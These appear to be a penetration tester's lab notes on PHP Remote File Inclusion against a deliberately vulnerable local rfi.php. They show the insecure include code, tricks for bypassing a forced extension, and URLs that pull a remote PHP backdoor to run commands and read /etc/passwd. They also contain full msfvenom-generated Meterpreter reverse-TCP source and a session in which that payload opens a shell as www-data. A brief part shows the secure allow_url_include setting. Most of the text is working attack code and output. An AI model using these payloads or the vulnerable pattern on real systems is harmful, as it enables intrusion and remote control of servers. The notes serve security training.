Remote File Inclusion

**********************************************************************************************************************************

User editable input is used to include other files in execution flow
Input is not sanitized and can lead to arbitrary files being included by a malicious user
In PHP, include, include_once, require, require_once are responsible for File Inclusions

**********************************************************************************************************************************

PHP File Include Reference
https://www.w3schools.com/php/php_includes.asp
http://www.phpforkids.com/php/php-functions-includes-requires.php

**********************************************************************************************************************************

Basic Remote File Inclusion

$ cat rfi.php
<?php

	echo "File included: ".$_REQUEST["file"]."<br>";
	echo "<br><br>";
	include $_REQUEST["file"];
	echo "<br><br>";

?>
$

Insecure configuration
allow_url_include = On
root@kali:/var/www/rfi# nano /etc/php5/apache2/php.ini
root@kali:/var/www/rfi# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:/var/www/rfi#

Local File Inclusion
http://localhost/rfi/rfi.php
http://localhost/rfi/rfi.php?file=home.php
http://localhost/rfi/rfi.php?file=contact.php
http://localhost/rfi/rfi.php?file=/etc/passwd

root@kali:~/Desktop# mkdir rfi
root@kali:~/Desktop# ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:c4:89:63
          inet addr:192.168.2.19  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fec4:8963/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:188534 errors:0 dropped:0 overruns:0 frame:0
          TX packets:82752 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:12819573 (12.2 MiB)  TX bytes:18907799 (18.0 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1532 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1532 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:310495 (303.2 KiB)  TX bytes:310495 (303.2 KiB)

root@kali:~/Desktop# cp /usr/share/webshells/php/simple-backdoor.php rfi/
root@kali:~/Desktop# cd rfi/
root@kali:~/Desktop/rfi# ls
simple-backdoor.php
root@kali:~/Desktop/rfi# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.2.19 - - [29/Oct/2015 20:08:16] "GET /simple-backdoor.php HTTP/1.0" 200 -
192.168.2.19 - - [29/Oct/2015 20:08:42] code 400, message Bad request syntax ('GET /simple-backdoor.php?cmd=cat /etc/passwd HTTP/1.0')
192.168.2.19 - - [29/Oct/2015 20:08:42] "GET /simple-backdoor.php?cmd=cat /etc/passwd HTTP/1.0" 400 -
192.168.2.19 - - [29/Oct/2015 20:08:48] code 400, message Bad request syntax ('GET /simple-backdoor.php7cmd=cat /etc/passwd HTTP/1.0')
192.168.2.19 - - [29/Oct/2015 20:08:48] "GET /simple-backdoor.php7cmd=cat /etc/passwd HTTP/1.0" 400 -
192.168.2.19 - - [29/Oct/2015 20:08:53] "GET /simple-backdoor.php HTTP/1.0" 200 -

Remote File Inclusion
http://localhost/rfi/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php
Replace ? with &
http://localhost/rfi/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php&cmd=cat+/etc/passwd
http://localhost/rfi/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php&cmd=pwd

Secure configuration
allow_url_include = Off
root@kali:/var/www/rfi# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:/var/www/rfi#

Monitor error logs
root@kali:/var/www/rfi# tail -f /var/log/apache2/error.log -n 0
[Thu Oct 29 20:13:45 2015] [error] [client 127.0.0.1] PHP Warning:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/rfi/rfi.php on line 5
[Thu Oct 29 20:13:45 2015] [error] [client 127.0.0.1] PHP Warning:  include(http://192.168.2.19:8000/simple-backdoor.php): failed to open stream: no suitable wrapper could be found in /var/www/rfi/rfi.php on line 5
[Thu Oct 29 20:13:45 2015] [error] [client 127.0.0.1] PHP Warning:  include(): Failed opening 'http://192.168.2.19:8000/simple-backdoor.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/rfi/rfi.php on line 5

http://localhost/rfi/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php&cmd=pwd
Doesnt work
http://localhost/rfi/rfi.php?file=/etc/passwd
Works

**********************************************************************************************************************************

RFI with Forced Extension

$ cat rfi.php
<?php

	echo "File included: ".$_REQUEST["file"]."<br>";
	echo "<br><br>";
	$remote_file =  $_REQUEST["file"].".html";
	echo "Remote file to be fetched: ".$remote_file;
	echo "<br><br>";

	include $remote_file;

?>
$

Techniques
1.) Make the extension useless and append any of the following
?
%23 (#)
?%26as= (?&as=)
2.) Attacker can rename file to whatever extension is needed
Eg - simple-backdoor.php.html

Insecure configuration
allow_url_include = On
root@kali:/var/www/rfi# nano /etc/php5/apache2/php.ini
root@kali:/var/www/rfi# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:/var/www/rfi#

root@kali:/var/www/rfi_limited#
root@kali:/var/www/rfi_limited# ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:c4:89:63
          inet addr:192.168.2.19  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fec4:8963/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:190675 errors:0 dropped:0 overruns:0 frame:0
          TX packets:83290 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:12979434 (12.3 MiB)  TX bytes:19012985 (18.1 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1925 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1925 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:366411 (357.8 KiB)  TX bytes:366411 (357.8 KiB)

root@kali:/var/www/rfi_limited#

http://localhost/rfi_limited/rfi.php
http://localhost/rfi_limited/rfi.php?file=home

root@kali:~/Desktop/rfi# ls
simple-backdoor.php
root@kali:~/Desktop/rfi# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.2.19 - - [29/Oct/2015 20:30:03] code 404, message File not found
192.168.2.19 - - [29/Oct/2015 20:30:03] "GET /simple-backdoor.php.html HTTP/1.0" 404 -

http://localhost/rfi_limited/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php
File included: http://192.168.2.19:8000/simple-backdoor.php
Remote file to be fetched: http://192.168.2.19:8000/simple-backdoor.php.html

Fix
root@kali:~/Desktop/rfi# cp simple-backdoor.php simple-backdoor.php.html
root@kali:~/Desktop/rfi# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.2.19 - - [29/Oct/2015 20:32:01] "GET /simple-backdoor.php.html HTTP/1.0" 200 -

http://localhost/rfi_limited/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php
http://localhost/rfi_limited/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php&cmd=cat+/etc/passwd
http://localhost/rfi_limited/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php&cmd=pwd
http://localhost/rfi_limited/rfi.php?cmd=id&file=http://192.168.2.19:8000/simple-backdoor.php?
http://localhost/rfi_limited/rfi.php?cmd=pwd&file=http://192.168.2.19:8000/simple-backdoor.php%23
http://localhost/rfi_limited/rfi.php?cmd=pwd&file=http://192.168.2.19:8000/simple-backdoor.php?%26var2=
http://localhost/rfi_limited/rfi.php?cmd=ls&file=http://192.168.2.19:8000/simple-backdoor.php?%26var2=

**********************************************************************************************************************************

RFI to Meterpreter

root@kali:~/Desktop# ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:c4:89:63
          inet addr:192.168.2.9  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fec4:8963/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:194450 errors:0 dropped:0 overruns:0 frame:0
          TX packets:84454 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:13273441 (12.6 MiB)  TX bytes:19115813 (18.2 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:2952 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2952 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:552610 (539.6 KiB)  TX bytes:552610 (539.6 KiB)

root@kali:~/Desktop#

root@kali:~# cd Desktop/
root@kali:~/Desktop# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.9 -f raw > meter.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
root@kali:~/Desktop# ls
DVWA-1.9.zip  meter.php  rfi
Remove the guard bit
root@kali:~/Desktop# cat meter.php
#<?php

error_reporting(0);
# The payload handler overwrites this with the correct LHOST before sending
# it to the victim.
$ip = '192.168.2.9';
$port = 4444;
$ipf = AF_INET;

if (FALSE !== strpos($ip, ":")) {
	# ipv6 requires brackets around the address
	$ip = "[". $ip ."]";
	$ipf = AF_INET6;
}

if (($f = 'stream_socket_client') && is_callable($f)) {
	$s = $f("tcp://{$ip}:{$port}");
	$s_type = 'stream';
} elseif (($f = 'fsockopen') && is_callable($f)) {
	$s = $f($ip, $port);
	$s_type = 'stream';
} elseif (($f = 'socket_create') && is_callable($f)) {
	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
	$res = @socket_connect($s, $ip, $port);
	if (!$res) { die(); }
	$s_type = 'socket';
} else {
	die('no socket funcs');
}
if (!$s) { die('no socket'); }

switch ($s_type) {
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
}
if (!$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
while (strlen($b) < $len) {
	switch ($s_type) {
	case 'stream': $b .= fread($s, $len-strlen($b)); break;
	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
	}
}

# Set up the socket for the main stage to use.
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
eval($b);
die();
root@kali:~/Desktop# nano meter.php
root@kali:~/Desktop# cat meter.php
<?php

error_reporting(0);
# The payload handler overwrites this with the correct LHOST before sending
# it to the victim.
$ip = '192.168.2.9';
$port = 4444;
$ipf = AF_INET;

if (FALSE !== strpos($ip, ":")) {
	# ipv6 requires brackets around the address
	$ip = "[". $ip ."]";
	$ipf = AF_INET6;
}

if (($f = 'stream_socket_client') && is_callable($f)) {
	$s = $f("tcp://{$ip}:{$port}");
	$s_type = 'stream';
} elseif (($f = 'fsockopen') && is_callable($f)) {
	$s = $f($ip, $port);
	$s_type = 'stream';
} elseif (($f = 'socket_create') && is_callable($f)) {
	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
	$res = @socket_connect($s, $ip, $port);
	if (!$res) { die(); }
	$s_type = 'socket';
} else {
	die('no socket funcs');
}
if (!$s) { die('no socket'); }

switch ($s_type) {
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
}
if (!$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
while (strlen($b) < $len) {
	switch ($s_type) {
	case 'stream': $b .= fread($s, $len-strlen($b)); break;
	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
	}
}

# Set up the socket for the main stage to use.
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
eval($b);
die();
root@kali:~/Desktop#

root@kali:~/Desktop# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.2.9 - - [29/Oct/2015 21:55:07] code 404, message File not found
192.168.2.9 - - [29/Oct/2015 21:55:07] "GET /meter.php.html HTTP/1.0" 404 -
192.168.2.9 - - [29/Oct/2015 21:56:03] "GET /meter.php?.html HTTP/1.0" 200 -

In Browser
http://localhost/rfi_limited/rfi.php?file=http://192.168.2.9:8000/meter.php?

In MSF
msf > use exploit/multi/handler
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.2.9
LHOST => 192.168.2.9
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.2.9:4444
[*] Starting the payload handler...
[*] Sending stage (40499 bytes) to 192.168.2.9
[*] Meterpreter session 1 opened (192.168.2.9:4444 -> 192.168.2.9:38474) at 2015-10-29 21:56:03 -0400

meterpreter >
meterpreter > pwd
/var/www/rfi_limited
meterpreter > ls

Listing: /var/www/rfi_limited
=============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  39    fil   2015-10-29 20:22:53 -0400  contact.html
100644/rw-r--r--  35    fil   2015-10-29 20:22:53 -0400  home.html
100644/rw-r--r--  217   fil   2015-10-29 20:22:53 -0400  rfi.php

meterpreter > shell
Process 22770 created.
Channel 0 created.
whoami
www-data
w
 21:57:22 up 10:50,  5 users,  load average: 0.16, 0.23, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty7     :0               11:08   10:50m 35.40s  0.06s gdm-session-wor
root     pts/0    :0.0             21:49    4:58   0.21s  0.09s python -m Simpl
root     pts/1    192.168.2.16     11:09    1:27m  0.98s  0.98s -bash
root     pts/2    :0.0             21:50    2.00s 15.20s 15.14s /opt/metasploit
root     pts/3    :0.0             21:54    2:34   0.05s  0.05s bash

**********************************************************************************************************************************
